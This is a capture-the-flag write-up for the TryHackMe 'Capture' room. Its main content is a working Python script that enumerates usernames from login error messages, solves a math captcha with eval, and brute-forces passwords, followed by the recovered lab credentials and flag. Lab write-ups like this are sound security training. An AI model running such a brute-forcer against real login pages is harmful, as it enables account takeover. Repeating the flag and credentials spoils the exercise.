----
Can you bypass the login form?
----

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/4b631e191c14bc9d6b2be078d1adde76.png)
### Task 1  General information

 Download Task Files

![Securesolacoders](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e3943bd2445e65e56afb7a5/room-content/b5a647b9469643ad859ac93c27dd8e3d.png)

SecureSolaCoders has once again developed a web application. They were tired of hackers enumerating and exploiting their previous login form. They thought a Web Application Firewall (WAF) was too overkill and unnecessary, so they developed their own rate limiter and modified the code slightly**.**

Before we start, download the required files by pressing the **Download Task Files** button.

Answer the questions below

I have downloaded the capture.zip file.

 Completed

### Task 2  Bypass the login form

 Start Machine

Please wait approximately 3-5 minutes for the application to start.  

You can find the web application at: **`http://MACHINE_IP`**

Answer the questions below

What is the value of flag.txt?

```
┌──(witty㉿kali)-[~/Downloads/capture]
└─$ unzip capture.zip 
Archive:  capture.zip
  inflating: passwords.txt           
  inflating: usernames.txt 

http://10.10.205.246/login

test:test

Error: The user 'test' does not exist 

using burp intruder (pitchfork) There's a captcha

┌──(witty㉿kali)-[~/Downloads/capture]
└─$ cat login.py  

┌──(witty㉿kali)-[~/Downloads/capture]
└─$ cat login2.py 
import requests, re

url = "http://10.10.205.246/login"

with open("usernames.txt", "rt") as fd:
	usernames = fd.read().splitlines()
	
with open("passwords.txt", "rt") as fd:
	passwords = fd.read().splitlines()
regex = re.compile(r"(\d+\s[+*/-]\s\d+)\s\=\s\?")
def send_post(username, password, captcha=None):
	data = {
		"username":username,
		"password":password,
	}
	if captcha:
		data.update({"captcha":captcha})
	response = requests.post(url=url, data=data)
	return response
def solve_captcha(response):
    captcha = re.findall(regex, response.text)[0]
    return eval(captcha)
for count in range(100):
	response = send_post("witty", "life")
	try:
		captcha = solve_captcha(response)
		print(f"Captcha synchronised! Next solution is: {captcha}")
		break
	except:
		pass
for username in usernames:
	response = send_post(username, "None", captcha)
	captcha = solve_captcha(response)
	if not "does not exist" in response.text:
		for password in passwords:
			response = send_post(username, password, captcha)
			if not "Error" in response.text:
				print(f"Success! Username:{username} Password:{password}")
				exit(0)
			else:
				captcha = solve_captcha(response)

┌──(witty㉿kali)-[~/Downloads/capture]
└─$ python3 login.py
Captcha synchronised! Next solution is: 191
Success! Username:natalie Password:sk8board

Flag.txt:
7df2eabce36f02ca8ed7f237f77ea416

```

![[Pasted image 20230621185435.png]]

Look at the error messages from the application when attempting to log in. Enumerate to discover the username (firstname). Then enumerate once more to discover the password.

*7df2eabce36f02ca8ed7f237f77ea416*
 

[[Valley]]













